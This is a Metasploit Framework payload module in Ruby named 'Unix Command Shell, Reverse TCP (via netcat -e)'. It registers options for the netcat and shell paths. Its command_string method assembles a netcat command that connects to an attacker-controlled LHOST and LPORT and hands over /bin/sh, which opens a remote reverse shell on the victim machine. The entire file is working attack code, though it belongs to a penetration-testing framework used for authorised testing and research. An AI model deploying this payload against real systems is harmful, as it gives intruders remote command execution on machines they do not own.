##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 34

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'          => 'Unix Command Shell, Reverse TCP (via netcat -e)',
     'Description'   => 'Creates an interactive shell via netcat',
     'Author'        => 'hdm',
     'License'       => MSF_LICENSE,
     'Platform'      => 'unix',
     'Arch'          => ARCH_CMD,
     'Handler'       => Msf::Handler::ReverseTcp,
     'Session'       => Msf::Sessions::CommandShell,
     'PayloadType'   => 'cmd',
     'RequiredCmd'   => 'netcat-e',
     'Payload'       =>
       {
         'Offsets' => { },
         'Payload' => ''
       }
    ))
    register_advanced_options(
      [
        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "#{datastore['NetcatPath']} #{datastore['LHOST']} #{datastore['LPORT']} -e #{datastore['ShellPath']}"
  end
end
